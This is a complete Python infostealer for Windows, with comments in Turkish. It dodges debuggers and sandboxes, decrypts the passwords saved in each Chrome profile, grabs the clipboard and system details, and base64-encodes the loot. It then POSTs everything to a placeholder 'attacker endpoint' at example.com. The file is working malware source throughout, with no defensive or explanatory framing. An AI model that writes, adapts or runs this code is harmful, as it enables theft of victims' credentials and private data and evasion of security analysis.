import os
import sys
import json
import base64
import shutil
import sqlite3
import time
import socket
import re
import uuid
import requests
import pyperclip
import platform
import ctypes
import psutil
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES

# ==========================
# Anti-Debugging Fonksiyonları
# ==========================
def is_debugger_present():
    """Debugging araçlarını tespit et"""
    try:
        # Windows API: IsDebuggerPresent
        kernel32 = ctypes.windll.kernel32
        if kernel32.IsDebuggerPresent():
            return True

        # Debugging ile ilgili bilinen process isimleri
        suspicious_processes = [
            "ollydbg", "x64dbg", "wireshark", "fiddler", "procmon",
            "processhacker", "ida64", "ida32", "windbg", "ghidra"
        ]

        for proc in psutil.process_iter(['name']):
            try:
                pname = proc.info['name'].lower()
                for sproc in suspicious_processes:
                    if sproc in pname:
                        return True
            except:
                continue

        return False
    except:
        return False


# ==========================
# Anti-Sandbox Fonksiyonları
# ==========================
def is_sandbox_environment():
    """Sandbox ortamı tespiti (VMWare, VirtualBox, düşük donanım vb.)"""
    try:
        # 1. Donanım kontrolü
        if psutil.cpu_count() <= 1:
            return True
        if psutil.virtual_memory().total / (1024 * 1024) < 2048:  # 2 GB altı RAM
            return True

        # 2. Bilinen sandbox process isimleri
        sandbox_processes = [
            "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
            "wireshark", "sandboxie", "procmon", "procexp", "qemu-ga"
        ]

        for proc in psutil.process_iter(['name']):
            try:
                pname = proc.info['name'].lower()
                for sproc in sandbox_processes:
                    if sproc in pname:
                        return True
            except:
                continue

        # 3. Bilgisayar adında sandbox göstergeleri
        suspicious_hostnames = ["sandbox", "maltest", "analysis", "vmware", "vbox"]
        hostname = socket.gethostname().lower()
        if any(word in hostname for word in suspicious_hostnames):
            return True

        return False
    except:
        return False


# ==========================
# Chrome Master Key Alma
# ==========================
def get_decryption_key():
    try:
        local_state_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        with open(local_state_path, 'r', encoding='utf-8') as file:
            local_state = json.loads(file.read())
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]  # Metadata'yı at
        return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        return None


# ==========================
# Chrome Şifre Çözme
# ==========================
def decrypt_password(password, key):
    try:
        if password.startswith(b'v10') or password.startswith(b'v11'):
            iv = password[3:15]
            encrypted_password = password[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password)
            return decrypted_pass.decode()
        else:
            return CryptUnprotectData(password, None, None, None, 0)[1].decode()
    except:
        return None


# ==========================
# Chrome'dan Şifreleri Çekme
# ==========================
def extract_browser_passwords():
    key = get_decryption_key()
    if key is None:
        return []

    credentials = []
    profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4']
    base_path = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data')

    for profile in profiles:
        login_db_path = os.path.join(base_path, profile, 'Login Data')
        if os.path.exists(login_db_path):
            try:
                shutil.copy2(login_db_path, 'LoginDataTemp.db')
                conn = sqlite3.connect('LoginDataTemp.db')
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    decrypted_password = decrypt_password(encrypted_password, key)
                    if decrypted_password:
                        credentials.append({
                            'profile': profile,
                            'url': origin_url,
                            'username': username,
                            'password': decrypted_password
                        })

                cursor.close()
                conn.close()
            except:
                pass
            finally:
                if os.path.exists('LoginDataTemp.db'):
                    os.remove('LoginDataTemp.db')

    return credentials


# ==========================
# Clipboard İçeriğini Çekme
# ==========================
def capture_clipboard():
    try:
        return pyperclip.paste()
    except:
        return None


# ==========================
# Sistem Bilgilerini Çekme
# ==========================
def steal_system_info():
    try:
        info = {
            'os': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'hostname': socket.gethostname(),
            'local-ip': socket.gethostbyname(socket.gethostname()),
            'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
            'processor': platform.processor()
        }

        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            info['global-ip-address'] = response.json().get('ip', 'N/A')
        except:
            info['global-ip-address'] = 'Could not fetch'

        return info
    except:
        return {}


# ==========================
# Veriyi HTTPS + Base64 ile Gönder
# ==========================
def send_data(data):
    try:
        url = "https://example.com/api/collect.php"  # Saldırganın endpoint'i
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        # JSON -> Base64
        json_data = json.dumps(data)
        encoded_data = base64.b64encode(json_data.encode()).decode()

        payload = {
            "id": str(uuid.uuid4()),  # Kurban ID
            "data": encoded_data
        }

        response = requests.post(url, json=payload, headers=headers, timeout=10)

        if response.status_code == 200:
            print("Veriler başarıyla gönderildi.")
        else:
            print(f"Sunucu hata kodu: {response.status_code}")

    except:
        pass


# ==========================
# Ana Çalışma Bloğu
# ==========================
if __name__ == "__main__":
    # Anti-Debugging kontrolü
    if is_debugger_present():
        sys.exit(0)  # Debugger tespit edilirse hemen çık

    # Anti-Sandbox kontrolü
    if is_sandbox_environment():
        sys.exit(0)  # Sandbox tespit edilirse hemen çık

    # Çalıntı verileri topla
    passwords = extract_browser_passwords()
    clipboard_content = capture_clipboard()
    system_info = steal_system_info()

    # Tek yapıda birleştir
    payload = {
        "system_info": system_info,
        "passwords": passwords,
        "clipboard": clipboard_content
    }

    # Veriyi HTTPS + Base64 ile saldırgana gönder
    send_data(payload)